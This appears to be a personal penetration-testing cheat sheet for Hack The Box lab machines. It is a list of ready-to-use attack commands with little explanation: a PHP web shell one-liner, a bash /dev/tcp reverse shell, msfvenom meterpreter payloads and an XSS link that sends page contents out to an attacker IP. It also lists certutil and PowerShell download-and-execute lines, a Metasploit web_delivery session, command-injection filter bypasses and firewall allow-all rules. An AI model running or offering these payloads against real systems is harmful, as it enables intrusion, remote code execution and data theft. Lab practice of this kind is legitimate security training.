sub-domain:
```bash
# wfuzz
wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u 'https://friendzoneportal.red/' -H "Host: FUZZ.friendzoneportal.red" --hc 404

# dig zone-transfer
dig AXFR friendzoneportal.red @10.129.112.70

# check /etc/hosts on machine
127.0.0.1 localhost titanic.htb dev.titanic.htb
127.0.1.1 titanic

```

ssh without password:

```bash
ssh-copy-id -i id_rsa.pub ubuntu@10.129.7.112

drwx------ 2 ubuntu ubuntu  4096 Oct 31 04:10 .ssh/
-rw------- 1 ubuntu ubuntu  583 Oct 31 04:10 authorized_keys

```

php b64 LFI:

```bash
php://filter/convert.base64-encode/resource=phpinfo.php
```

PHP shell:

```bash
# one liner
<?php if(isset($_GET['cmd'])){system($_GET['cmd'] . ' 2>&1');}?>

# landanum
/usr/share/laudanum/php
```

Reverse shell

```bash
echo -n "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.19/443  0>&1'" > test.sh
msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
```

javascript fetch:

```bash
<a href='javascript:fetch("http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md").then(response=>response.text()).then(data=>fetch("http://10.10.14.17:1111/?d="+encodeURIComponent(btoa(unescape(encodeURIComponent(data))))));'>XSS test</a>
```

Hashcat:

```bash
hashcat --force --stdout pwlist.txt -r /usr/share/hashcat/rules/base64.rule
hashcat --example-hashes | grep -i krb
```

ping sweep

```bash
# cmd
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"

# bash 
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
for i in {1..254}; do (ping -c 1 172.19.0.${i} | grep "bytes from" | grep -v "Unreachable" &); done;
# port
**for port in {1..65535}; do echo > /dev/tcp/172.19.0.1/$port && echo "$port open"; done 2>/dev/null**           

# powershell
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}
```

powershell download file:

```bash
# download and save 
certutil -urlcache -split -f http://10.10.14.5:8000/rev.exe C:\\Users\\Public\\rev.exe

# download and execute
cmd /c powershell IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5:8000/Invoke-PowerShellTcp.ps1') | powershell -noprofile
```

powershell reverse payload:

```bash
[msf](Jobs:0 Agents:0) >> use exploit(multi/script/web_delivery)
[*] Using configured payload python/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) >> set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) >> set TARGET 2
TARGET => 2
[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) >> set SRVHOST 172.16.7.240
SRVHOST => 172.16.7.240
[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) >> set LHOST 172.16.7.240
LHOST => 172.16.7.240
[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) >> exploit
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 172.16.7.240:4444
[*] Using URL: http://172.16.7.240:8080/za1FaPR8o
[*] Server started.
[*] Run the following command on the target machine:
```

```bash
install python 

IIIhtbacademy@htb[/htb]$ curl https://pyenv.run | bash
IIIhtbacademy@htb[/htb]$ echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.bashrc
IIIhtbacademy@htb[/htb]$ echo 'command -v pyenv >/dev/null || export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.bashrc
IIIhtbacademy@htb[/htb]$ echo 'eval "$(pyenv init -)"' >> ~/.bashrc
IIIhtbacademy@htb[/htb]$ source ~/.bashrc
IIIhtbacademy@htb[/htb]$ pyenv install 2.7
IIIhtbacademy@htb[/htb]$ pyenv shell 2.7

```

## port forwarding

neoreg.py

## command injection

```bash
curl http://10.10.10.10/`id`
curl http://10.10.10.10/$(id)
curl http://10.10.10.10/$(echo+test)

$ echo$IFS"test"
$ echo$IFS'test'
$ {echo,test}
$ echo dGVzdAo= | 'base64' '-d'
test

```

## Firewall allow all

```bash
New-NetFirewallRule -Name "thisistest2" -Protocol UDP -LocalPort Any -Action Allow -Direction In

New-NetFirewallRule -Name "thisistest" -Protocol TCP -LocalPort Any -Action Allow -Direction In

# NTP
 Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer" -Name "Enabled" -Value 1
 Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\W32Time\Config" -Name "AnnounceFlags" -Value 5
 Restart-Service w32time
```